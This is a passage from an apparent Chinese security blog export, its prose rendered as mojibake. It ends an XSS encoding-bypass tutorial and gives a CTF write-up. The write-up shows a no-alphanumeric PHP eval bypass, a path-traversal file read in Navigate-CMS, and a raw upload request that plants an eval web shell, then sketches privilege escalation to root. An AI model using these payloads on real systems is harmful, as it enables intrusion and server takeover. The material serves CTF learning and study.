class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0034;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0038;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0039;</span>&quot;</span>&gt;</span>3333<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç°åœ¨æˆ‘ä»¬å¯¹äºè¿™ç§æµè§ˆå™¨çš„ç¼–ç æœ‰ä¸ªåŸºæœ¬çš„è®¤è¯†äº†ï¼Œä½†æ˜¯å‰é¢è¯´åˆ°è¿™ä¸ªjavascriptå¯ä»¥æ“çºµdomï¼Œè¿›è¡ŒåŠ¨æ€ç”ŸæˆèŠ‚ç‚¹ï¼Œä¹Ÿæ˜¯äº§ç”Ÿdomxssçš„é‡è¦åŸå› ï¼Œä¸‹é¢è¿™ä¸ªè§£ç å°±æ¯”è¾ƒå¤æ‚äº†ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;input value=&quot;ä¿®æ”¹URL&quot; id=&quot;b&quot;&gt; --&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ç¡®å®š&quot;</span> <span class="attr">onclick</span>=<span class="string">modify_src()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">modify_src</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> b = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;b&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// ç”¨æˆ·å¯æ§ç‚¹value</span></span></span><br><span class="line"><span class="language-javascript">		a.<span class="property">innerHTML</span>=<span class="string">&quot;&lt;img src=# onerror=alert(123)&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// // htmlç¼–ç å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// function htmlEncodeByRegExp(str) &#123;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         var temp = &quot;&quot;;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         if (str.length == 0) return &quot;&quot;;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/\&#x27;/g, &quot;&amp;#39;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         return temp;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹ä¸Šé¢è¿™ä¸ªå¦‚æœinnerHTMLå¯æ§ä¼šæœ‰å¤šå°‘ç§ç¼–ç æ–¹å¼ï¼Ÿå¦‚æœä½ çœŸçš„ç†è§£äº†è¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼Œåº”è¯¥æ˜¯å¤šå±‚unicodeå’ŒHTMLç¼–ç å¯ä»¥æ··ç”¨ä¾ç„¶æ‰§è¡Œå¼¹çª—ã€‚</p>
<p>æ‰€ä»¥ï¼Œå¾—å‡ºç»“è®ºï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å¦‚æœå¿…é¡»æ’å…¥æ ‡ç­¾æ‰èƒ½è§¦å‘çš„xsså®ä½“åŒ–ç¼–ç è¿˜æ˜¯å¥½ç”¨çš„ï¼Œå½“ç„¶ï¼Œå…·ä½“æƒ…å†µè¦å…·ä½“åˆ†æ</p>
<p>å¦å¤–æˆ‘ä»¬åœ¨ä¸€äº›è¿‡æ»¤ç»•è¿‡ä¸­ï¼Œå‘ç°svgçš„å‡ºåœºæ¬¡æ•°ä¹ŸæŒºé«˜çš„ï¼Œè¿™æ˜¯å› ä¸ºsvgæ˜¯å¯ä»¥å†…åµŒå…¶ä»–æ ‡ç­¾ï¼ŒåŒæ—¶ä¼šè¢«htmlè§£ç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x006c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x0028;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0029;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>HTMLè§£æã€CSSè§£æã€JSè§£æå’ŒURLè§£æã€‚è¿™å››ä¸ªè§£æå™¨çš„è§£æé¡ºåºææ‡‚ï¼ŒXSSçš„ç¼–ç ç»•è¿‡é—®é¢˜å°±æ¯”è¾ƒå®¹æ˜“ç†è§£äº†ï¼Œé‡åˆ°ä¸€äº›SRCçš„xssç‚¹ä¹Ÿå¯ä»¥ç»•è¿‡çš„æ›´ä»å®¹ä¸€ç‚¹ã€‚</p>
<h2 id="Refrence"><a href="#Refrence" class="headerlink" title="Refrence"></a>Refrence</h2><ul>
<li><p><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p>
</li>
<li><p><a href="http://taligarsiel.com/Projects/howbrowserswork1.htm#Parsing_general">http://taligarsiel.com/Projects/howbrowserswork1.htm#Parsing_general</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>é¹ç¨‹æ¯CTF-ä¸¤é“æœ‰æ„æ€çš„é¢˜ç›®</title>
    <url>//posts/PCL-CTF-WEB2/</url>
    <content><![CDATA[<p>å…¶å®è¿™æ¬¡webé¢˜ç›®è´¨é‡ä¸€èˆ¬ï¼Œå¯èƒ½webåªæœ‰ä¸€é“é¢˜ç›®åšèµ·æ¥è®©äººè§‰å¾—çŸ¥è¯†ç‚¹å’Œè€ƒå¯Ÿæ–¹å¼éƒ½å¾ˆå¥½ï¼Œæ—¢ç®€å•åˆå›°éš¾çš„é‚£ç§æ„Ÿè§‰å§ï¼Œwebé¢˜ç›®åº”è¯¥æ˜¯AKäº†ï¼Œä½†æ˜¯æœ‰ä¸€éƒ¨åˆ†æ²¡å•¥è¥å…»ï¼Œè¿™é‡Œå°±è®°å½•ä¸‹ä¸¤é“é¢˜ç›®ï¼š</p>
<p>1ã€ç®€å•çš„php </p>
<p>2ã€é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹</p>
<h2 id="ç®€å•çš„php"><a href="#ç®€å•çš„php" class="headerlink" title="ç®€å•çš„php"></a>ç®€å•çš„php</h2><p>è¿™é“é¢˜ç›®å…¶å®ä»¥å‰ä¹Ÿé‡åˆ°è¿‡ï¼Œä¸è¿‡è¿™é‡Œè¿‡æ»¤äº†æ›´å¤šçš„ä¸œè¥¿ï¼Œä¸­å¿ƒæ€æƒ³è¿˜æ˜¯ä¸€è‡´çš„ï¼Œæˆ‘ä»¬é¦–å…ˆçœ‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>ç¬¬ä¸€ä¸ªè€ƒç‚¹æ˜¯æ— ç¬¦å·æ‰§è¡Œï¼Œå°±æ˜¯åŸºæœ¬å„ç§ç¬¦å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹ä¸‹è¿˜å‰©ä»€ä¹ˆï¼Œä¸€èˆ¬å‰©ä»€ä¹ˆå°±æ˜¯è€ƒä»€ä¹ˆï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$code</span>=<span class="string">&quot;ï½1234567890-=qwertyuiop[]asdfghjkl;&#x27;zxcvbnm,./!@#$%^&amp;*()_+QWERTYUIOP&#123;&#125;ASDFGHJKL:\\ \&quot;ZXCVBNM&lt;&gt;?&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¸Šè¿°ä»£ç å¯å¾—åˆ°å¯ç”¨å­—ç¬¦å¦‚ä¸‹ï¼š[];!@#%*()_{}:&lt;</p>
<p>åŸºæœ¬ä¸Šé¢˜ç›®è¦ä¸ç•™ä¸€ä¸ª ^ è®©ä½ å¼‚æˆ–å‡ºæ¥ï½ç»§ç»­æ‹¼è£…(ä¹Ÿå¯ä»¥å¼‚æˆ–å…¶ä»–å‡ºæ¥ï¼Œå…¨å‡­æƒ³è±¡)ï¼Œè¦ä¸å°±ç»™ä½ ç•™ä¸‹æ¥è¿™ä¸ªï½ã€‚è¿™é‡Œæœ‰è¿™ä¸ªï½ï¼Œç›´æ¥å°±å¯ä»¥å¼€å¹²ï¼Œé¦–å…ˆåŸºæœ¬ä¸Šå¯è§å­—ç¬¦çš„å–åéƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œä¸å¯è§å­—ç¬¦å½“ç„¶ç¬¦åˆè¿™ä¸ªæ— å­—ç¬¦æ­£åˆ™ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸å¯è§å­—ç¬¦å–åç»•è¿‡æ­£åˆ™ï¼Œè¿™é‡Œä¹Ÿå†™ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//system(end(getheaders()))</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;end&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;getheaders&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªè€ƒç‚¹æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯payloadç»è¿‡å¾ªç¯è¿‡æ»¤åä»…å‰©ä¸‹;  ä¹Ÿå°±æ˜¯payloadåªèƒ½æ˜¯æ— å‚çš„å½¢å¼ï¼ša(abc(dsada())); è¿™ç§</p>
<p>é‚£æˆ‘ä»¬å°±ç”¨ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼š</p>
<p>getheadersè·å–headersä¿¡æ¯ï¼Œendæ˜¯è·å–æœ€åä¸€ä¸ªï¼Œsystemç›´æ¥ç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬åªéœ€æŠŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ”¾å…¥headerçš„æœ€åä¸€ä¸ªå­—æ®µå°±è¡Œäº†ã€‚system(end(getheaders())) </p>
<p><img data-src="/images/pages/image-20220705155003413.png" alt="image-20220705155003413"></p>
<h2 id="é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹"><a href="#é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹" class="headerlink" title="é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹"></a>é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹</h2><p>ç”±äºæ²¡æœ‰ç¯å¢ƒäº†å¯èƒ½åªæ˜¯è¯´ä¸€ä¸‹æ€è·¯å’Œå½“æ—¶é‡åˆ°çš„é—®é¢˜ã€‚</p>
<p>é¦–å…ˆè¿™é“é¢˜ç›®æ˜¯Navigate-CMS ç›®å½•æœ‰gitæ³„æ¼ï¼š</p>
<p><img data-src="/images/pages/image-20220705160301716.png" alt="image-20220705160301716"></p>
<p>ä½†æ˜¯è¿™é‡Œçš„gitæ³„æ¼æˆ‘å¹¶æ²¡æœ‰æ‹¿åˆ°æºç ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æœ‰ä»€ä¹ˆå¥‡æ€ªçŸ¥è¯†ç‚¹ã€‚æ‰€ä»¥å°±å»githubä¸Šæ‰¾äº†å¯¹åº”çš„<a href="https://github.com/NavigateCMS/Navigate-CMS">Navigatecms</a> æºç </p>
<p>é€šè¿‡æœç´¢æœ€è¿‘çš„æ¼æ´è¯¦æƒ…ï¼Œå‘ç°2022å¹´åˆšçˆ†å‡ºä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´æé†’ï¼Œæ ¹æ®ä»£ç å®¡è®¡äº†å¯¹åº”ä»£ç å‘ç°åœ¨navigate_download.phpå­˜åœ¨idå‚æ•°çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼š</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ flagä¸åœ¨æ ¹ç›®å½•ã€‚</p>
<p>ç„¶åæœç´¢åˆ°å¦ä¸€ä¸ªä»»æ„æ–‡ä»¶è¦†ç›–ä¸Šä¼ ï¼š</p>
<p><a href="https://www.exploit-db.com/exploits/45561">https://www.exploit-db.com/exploits/45561</a></p>
<p>ä½†æ˜¯å› ä¸ºgithubçš„ä»£ç æ˜¯æœ€æ–°çš„æ‰€ä»¥å·²ç»ä¿®å¤è¿‡äº†ï¼Œåªèƒ½é€šè¿‡ä¸Šé¢çš„ä»»æ„æ–‡ä»¶è¯»å–æ‹¿åˆ°navigate_upload.phpæºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../var/www/html/navigate_upload.php</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°æºç å‘ç°æ¼æ´å­˜åœ¨äº139è¡Œ</p>
<p><img data-src="/images/pages/image-20220705161744409.png" alt="image-20220705161744409"></p>
<p>engine&#x3D;picnikæ—¶å¯ä»¥è¿›è¡Œæ–‡ä»¶è¦†ç›–ï¼Œä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†..&#x2F; ä»ç„¶å¾ˆå¥½ç»•è¿‡ é€šè¿‡â€¦&#x2F;.&#x2F;å¾—åˆ°..&#x2F;ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¦†ç›–navigate_info.phpè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/navigate_upload.php?session_id=vcu80v6qbgcjrajhka5acjh887&amp;engine=picnik&amp;id=../../../navigate_info.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.116</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>519</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysFc8yFB2XMDgA35C</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.116</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.116/navigate.php?fid=websites&amp;act=2&amp;id=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>NVSID_7da51544=vcu80v6qbgcjrajhka5acjh887; PHPSESSID=vcu80v6qbgcjrajhka5acjh887; navigate-tinymce-scroll=%7B%7D; navigate-user=efc2e3b89151d3e84e01f5fc10d841703bf119dd; navigate-language=en; navigate-tree-structure-1=%5B%22node-0%22%2C%22node-2%22%5D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">12222345</span>.php</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunk&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">0</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunks&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">1</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;122245.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">phpinfo</span>();</span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmdd5556&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C--</span></span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°shellæˆ‘ä»¬å‘ç°æ ¹ç›®å½•å­˜åœ¨I_want_capture_the_flagäºŒè¿›åˆ¶æ–‡ä»¶,ä½†æ˜¯è¿è¡Œè¯´ä»€ä¹ˆçš‡å®¶èµŒåœºè¿˜æ²¡ä¸‹çº¿ï¼Œä¸ç»™flagï¼ŒäºŒè¿›åˆ¶é€†å‘å‘ç°å›å»åˆ¤æ–­ä¸¤ä¸ªæ–‡ä»¶å­˜ä¸å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å†é€šè¿‡ä¸€ç³»åˆ—è¿ç®—ç»™å‡ºflag:</p>
<p><img data-src="/images/pages/image-20220705162041847.png" alt="image-20220705162041847"></p>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“éœ€è¦åˆ é™¤&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.* ,ä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æƒé™ï¼Œè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ææƒã€‚é¦–å…ˆæˆ‘ä»¬æ ¹æ®ç½‘ç«™ç›®å½•ä¸‹çš„éšè—phpæ–‡ä»¶-&gt;</p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;.my_date.php  çš„æç¤ºæ‹¿åˆ°è´¦å·å¯†ç  å¹¶å¯ä»¥sshç™»é™† ã€‚ç™»é™†åå‘ç°è´¦æˆ·ä¸‹é¢å­˜åœ¨.get_rootç›®å½•é‡Œé¢æœ‰ç°æˆçš„ææƒè„šæœ¬ï¼Œå…ˆåˆ©ç”¨æºç ä¸­çš„é…ç½®æ–‡ä»¶æ³„æ¼çš„ç”¨æˆ·navigate è¿è¡Œmysql-privesc-raceæ‹¿åˆ°mysqlæƒé™ï¼ˆæ—¶é—´å¾ˆé•¿ï¼Œè¦ç­‰å¾ˆä¹…è¦æœ‰è€å¿ƒï¼‰ï¼Œå†åˆ©ç”¨å¾—åˆ°çš„mysqlè´¦æˆ·æƒé™è¿è¡Œmysql-chowned.shï¼Œæ‹¿åˆ°rootã€‚ï¼ˆè¿™ä¸¤ä¸ªææƒç½‘ä¸Šå¯ä»¥æœç´¢åˆ°ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œç¬¬ä¸€æ­¥ææƒæœ‰æ¡ä»¶ç«äº‰éœ€è¦ç­‰å¾…è¾ƒé•¿æ—¶é—´ï¼‰</p>
<p>æ‹¿åˆ°rootåæˆ‘ä»¬å»åˆ é™¤&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.*  ä¾ç„¶ä¸è¡Œï¼Œåæ¥å‘ç°æ–‡ä»¶å­˜åœ¨aå±æ€§ï¼Œé€šè¿‡ä¿®æ”¹å±æ€§å³å¯åˆ é™¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsattr bocai.png</span><br><span class="line">chattr -a bocai.png</span><br><span class="line">lsattr bocai.html</span><br><span class="line">chattr -a bocai.html</span><br></pre></td></tr></table></figure>

<p>æœ€åæˆ‘ä»¬åˆ é™¤bocai.*  å†æ¬¡è¿è¡Œ&#x2F;var&#x2F;www&#x2F;html&#x2F;I_want_capture_the_flagæ‹¿åˆ°flag</p>
<p><strong>æ‹“å±•</strong></p>
<p>Linux chattrå‘½ä»¤ç”¨äºæ”¹å˜æ–‡ä»¶å±æ€§ã€‚</p>
<p>è¿™é¡¹æŒ‡ä»¤å¯æ”¹å˜å­˜æ”¾åœ¨ext2æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•å±æ€§ï¼Œè¿™äº›å±æ€§å…±æœ‰ä»¥ä¸‹8ç§æ¨¡å¼ï¼š</p>
